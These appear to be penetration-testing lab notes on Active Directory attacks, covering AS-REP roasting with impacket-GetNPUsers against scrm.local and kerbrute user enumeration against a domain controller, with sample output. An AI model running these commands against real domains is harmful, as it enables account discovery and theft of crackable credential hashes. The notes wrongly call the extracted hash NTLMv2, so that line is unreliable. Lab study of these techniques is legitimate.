#### Unauthenticated

If we get valid users we can try to request TGT tickets to authenticate as another user:

#Note Remember to add the name of the domain controller into the /etc/hosts for this command to work.
```bash
impacket-GetNPUsers scrm.local/ -no-pass -usersfile ../content/validUsers
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User ASMITH@scrm.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User JHALL@scrm.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User KSIMPSON@scrm.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User KHICKS@scrm.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SJENKINS@scrm.local doesn't have UF_DONT_REQUIRE_PREAUTH set
```

#### Kerbrute
Kerbrute extracts the NTLMv2 hash automatically if two conditions are meet:
* If the user is valid.
* If the user has no pre auth required.
```bash
kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.175 /usr/share/seclists/Kerberos/A-ZSurnames.txt
```
[[Sauna#^9e845d]]
